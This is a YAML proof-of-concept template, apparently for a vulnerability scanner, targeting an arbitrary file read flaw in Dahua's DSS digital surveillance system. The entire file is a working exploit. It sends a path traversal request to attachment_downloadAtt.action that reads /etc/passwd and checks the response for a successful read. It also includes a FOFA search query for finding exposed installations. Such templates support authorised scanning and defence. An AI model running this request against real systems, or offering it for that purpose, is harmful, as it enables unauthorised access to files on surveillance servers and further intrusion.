id: poc-yaml-dahua-dss-attachment-downloadatt-action-anyfile-read
info:
  name: 大华 DSS 数字监控系统 attachment_downloadAtt.action 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 大华 DSS 数字监控系统
  fofa: app="dahua-DSS"
requests:
- method: GET
  path: /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd
  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
    && contains(content_type,"text/x-msdownload") && !contains(body,"<")
variables: {}
transport: http
